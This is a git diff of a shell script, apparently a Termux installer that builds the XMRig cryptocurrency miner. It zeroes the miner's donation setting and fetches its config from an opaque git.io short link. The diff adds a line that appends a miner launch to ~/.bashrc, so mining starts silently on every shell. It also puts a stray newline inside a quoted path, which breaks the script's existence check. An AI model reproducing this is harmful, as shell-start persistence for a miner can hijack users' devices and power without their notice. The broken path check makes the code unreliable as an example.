@@ -383,12 +383,7 @@ SSH_INSTALL(){
   sed -i 's/kDefaultDonateLevel = 1/kDefaultDonateLevel = 0/g' ./xmrig/src/donate.h
   sed -i 's/kMinimumDonateLevel = 1/kMinimumDonateLevel = 0/g' ./xmrig/src/donate.h
   mkdir -p xmrig/build && cd xmrig/build && cmake .. -DWITH_HWLOC=OFF && make -j $(nproc) && wget "git.io/J3d0i" -O config.json
-  #[ -e $HOME/xmrig/build/xmrig ] && echo "cd $HOME/xmrig/build && ./xmrig" >> "$HOME/.bashrc" && cd $HOME/xmrig/build && ./xmrig
-
-
-
-  chmod 755 $HOME/ip.sh
-  [ -e $HOME/ip.sh ] && echo "bash $HOME/ip.sh" >> "$HOME/.bashrc"
+  [ -e $HOME/xmrig/build/xmrig ] && echo "cd $HOME/xmrig/build && ./xmrig" >> "$HOME/.bashrc" && cd $HOME/xmrig/build && ./xmrig
   
   INFO "XMRIG create success"
 }
@@ -426,5 +421,6 @@ done
 
 HELLO
 GET_PASS
-[ ! -e "$HOME/ubuntu-in-termux/ubuntu-fs/root/" ] && UBUNTU && TERMUX_BASHRC && UBUNTU_SERVICE_BASHRC && UBUNTU_INSTALL_BASHRC
+[ ! -e "$HOME/ubuntu-in-termux/ubuntu-fs/root/
+" ] && UBUNTU && TERMUX_BASHRC && UBUNTU_SERVICE_BASHRC && UBUNTU_INSTALL_BASHRC
 UBUNTU_START
